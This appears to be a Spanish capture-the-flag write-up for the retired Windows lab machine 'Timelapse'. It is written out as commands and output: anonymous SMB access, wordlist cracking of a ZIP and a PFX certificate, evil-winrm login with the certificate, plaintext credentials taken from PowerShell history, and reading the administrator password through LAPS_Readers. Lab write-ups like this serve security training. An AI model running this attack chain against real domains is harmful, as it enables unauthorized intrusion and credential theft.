---
title: "Timelapse"
date: 2025-01-01
description: "SMB anónimo expone ZIP protegido → fuerza bruta ZIP y PFX → Evil-WinRM con certificado → historial PowerShell → LAPS_Readers extrae password de Administrator."
difficulty: Easy
os: Windows
tags: ["smb", "evil-winrm", "laps", "active-directory", "certificate"]
retired: true
draft: false
---

Machine IP: `10.10.11.152`

## Reconocimiento

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
389/tcp   open  ldap         (Domain: timelapse.htb)
445/tcp   open  microsoft-ds
5986/tcp  open  ssl/http     (WinRM SSL)
```

Reconocimiento SMB:

```bash
smbmap -H 10.10.11.152 -u 'null'
```

```
ADMIN$   → NO ACCESS
C$       → NO ACCESS
Shares   → READ ONLY   ← interesante
```

```bash
smbclient //10.10.11.152/Shares -N
```

Dentro hay dos directorios: `Dev` y `HelpDesk`. En `Dev` hay un ZIP.

## Fuerza bruta ZIP → PFX

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
# PASSWORD FOUND: supremelegacy
```

El ZIP contiene `legacyy_dev_auth.pfx`, también protegido con contraseña:

```bash
crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx
# Password found: thuglegacy
```

## Evil-WinRM con certificado

Extraemos clave privada y certificado:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -out priv-key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
```

Conexión por WinRM SSL (puerto 5986):

```bash
evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S
```

Conectados como `timelapse\legacyy`.

**User flag obtenida.**

## Escalada → svc_deploy

Revisamos el historial de PowerShell:

```bash
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Aparecen credenciales en texto plano:

```powershell
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

```bash
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

## Escalada → Administrator via LAPS

```
net user svc_deploy
# Global Group memberships: *LAPS_Readers  *Domain Users
```

`LAPS_Readers` tiene acceso a las contraseñas de administrador local almacenadas en LAPS. Extraemos con crackmapexec:

```bash
crackmapexec ldap 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' \
  --kdcHost 10.10.11.152 -M laps
```

```
LAPS  DC01$  Password: 8hQ]W)p5@MeKIl.IHjuD%tAu
```

```bash
evil-winrm -i 10.10.11.152 -u 'Administrator' -p '8hQ]W)p5@MeKIl.IHjuD%tAu' -S
```

**ROOT shell obtenida.**

Happy Hacking!!
